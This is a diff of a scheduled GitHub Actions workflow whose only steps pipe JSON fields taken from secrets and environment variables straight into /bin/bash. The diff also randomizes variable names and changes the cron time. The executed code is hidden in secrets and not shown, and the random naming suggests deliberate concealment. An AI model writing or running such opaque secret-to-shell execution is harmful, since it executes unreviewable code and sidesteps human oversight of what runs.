@@ -1,31 +1,23 @@
 name: caoyukaiming
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 0/6 * * *'
+    - cron: '32 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caoyukaiming
         env:
-          tix297: ${{ secrets.tix297 }}
+          kp86438: ${{ secrets.kp86438 }}
         run: |
-          echo $tix297 | jq -r .yyxsu86 | /bin/bash
-          echo $lv360 | jq -r .fqr67015 | /bin/bash
-          echo $g387 | jq -r .kx9595 | /bin/bash
-          echo $xgw84 | jq -r .sqmcj07 | /bin/bash
-          echo $t0 | jq -r .vhk42 | /bin/bash
-          echo $hepi14 | jq -r .km998 | /bin/bash
-          echo $vrwb1397 | jq -r .etnlq265 | /bin/bash
-          echo $thn28580 | jq -r .t7242 | /bin/bash
-          echo $hzqw28044 | jq -r .dvcx09241 | /bin/bash
-          echo $k9 | jq -r .icqv25448 | /bin/bash
-          echo $yb1 | jq -r .c8 | /bin/bash
-          echo $rews3841 | jq -r .tv2 | /bin/bash
-          echo $pwu2729 | jq -r .xue89334 | /bin/bash
-          echo $sgq680 | jq -r .rx59 | /bin/bash
-          echo $mwh36759 | jq -r .coa527 | /bin/bash
+          echo $kp86438 | jq -r .vccwp227 | /bin/bash
+          echo $ctke2792 | jq -r .wq751 | /bin/bash
+          echo $nqxiv157 | jq -r .sxkn28749 | /bin/bash
+          echo $nrmob1557 | jq -r .zal710 | /bin/bash
+          echo $axr81 | jq -r .xplz90 | /bin/bash
 
